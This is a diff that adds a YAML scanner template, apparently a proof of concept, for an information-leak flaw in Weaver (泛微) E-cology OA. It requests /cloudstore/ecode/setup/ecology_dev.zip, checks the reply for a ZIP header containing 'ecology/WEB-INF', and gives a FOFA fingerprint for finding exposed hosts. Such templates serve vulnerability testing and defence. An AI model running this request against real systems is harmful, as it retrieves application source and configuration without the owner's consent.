@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-cology-setup-info-leak
+info:
+  name: 泛微OA E-cology setup 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: e-cology
+  fofa: app="泛微-协同办公OA"
+requests:
+- method: GET
+  path: /cloudstore/ecode/setup/ecology_dev.zip
+  headers:
+    Range: bytes=0-500
+  expression: (status_code == 200 || status_code == 206) && substr(body, 0, 4) ==
+    "\x50\x4b\x03\x04" && contains(body,"ecology/WEB-INF")
+variables: {}
+transport: http
